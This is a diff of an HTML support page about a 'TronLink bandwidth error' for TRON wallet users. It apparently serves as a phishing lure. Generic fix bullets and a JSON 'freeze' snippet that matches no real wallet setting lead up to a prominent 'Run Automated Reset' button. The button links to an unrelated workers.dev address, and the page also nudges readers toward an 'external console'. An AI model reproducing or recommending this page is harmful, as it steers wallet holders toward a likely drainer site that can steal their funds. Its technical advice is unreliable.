@@ -23,9 +23,9 @@
         border-radius: 12px;
         overflow-x: auto;
     }
-    a { color: #cf6679; }
+    a { color: #ff7b2c; }
     .btn {
-        background: #ff7b2c;
+        background: #cf6679;
         color: #000;
         padding: 14px 36px;
         border-radius: 40px;
@@ -41,7 +41,7 @@
 <div class="content">
 <h2>Symptom</h2>
 <ul>
-<li>Users encounter a "TronLink bandwidth error" when attempting to perform transactions or interact with smart contracts on the TRON network, resulting in failed or pending transactions.</li>
+<li>Users encounter a "TronLink bandwidth error" when attempting to perform transactions or interact with smart contracts on the TRON network using the TronLink wallet.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
@@ -50,21 +50,25 @@
 <h3>Manual Overrides</h3>
 <ul>
 <li>Increase the account's bandwidth by freezing TRX tokens for a specified period.</li>
-<li>Adjust the transaction parameters, such as the transaction fee or bandwidth limit, to optimize resource utilization.</li>
-<li>Utilize the following code to check the account's current bandwidth:</li>
+<li>Allocate additional energy to the account by staking TRX tokens.</li>
+<li>Adjust the wallet's settings to optimize bandwidth and energy consumption:</li>
 </ul>
-<div class="codehilite"><pre><span></span><code>curl<span class="w"> </span>-X<span class="w"> </span>POST<span class="w"> </span><span class="se">\</span>
-<span class="w">  </span>https://api.trongrid.io/wallet/getaccount<span class="w"> </span><span class="se">\</span>
-<span class="w">  </span>-H<span class="w"> </span><span class="s1">&#39;Content-Type: application/json&#39;</span><span class="w"> </span><span class="se">\</span>
-<span class="w">  </span>-d<span class="w"> </span><span class="s1">&#39;{&quot;address&quot;: &quot;your_tron_address&quot;}&#39;</span>
+<div class="codehilite"><pre><span></span><code><span class="p">{</span>
+<span class="w">  </span><span class="nt">&quot;bandwidth&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="nt">&quot;freeze&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
+<span class="w">      </span><span class="nt">&quot;amount&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">1000</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;duration&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">3</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="w">  </span><span class="p">}</span>
+<span class="p">}</span>
 </code></pre></div>
 
-<p>Consider utilizing an external console to execute these commands for more flexibility. </p>
+<p>Consider utilizing an external console for further troubleshooting and configuration.</p>
 <h2>Prerequisites</h2>
 <ul>
-<li>A TRON account with a sufficient balance of TRX tokens.</li>
-<li>The TronLink wallet extension installed and configured.</li>
-<li>A basic understanding of TRON's resource management system, including bandwidth and energy.</li>
+<li>A TRON account with a sufficient TRX balance</li>
+<li>The latest version of the TronLink wallet installed</li>
+<li>A basic understanding of TRON's bandwidth and energy mechanisms</li>
 </ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=gKMyej%40%40" class="btn">🛠 Run Automated Reset</a>
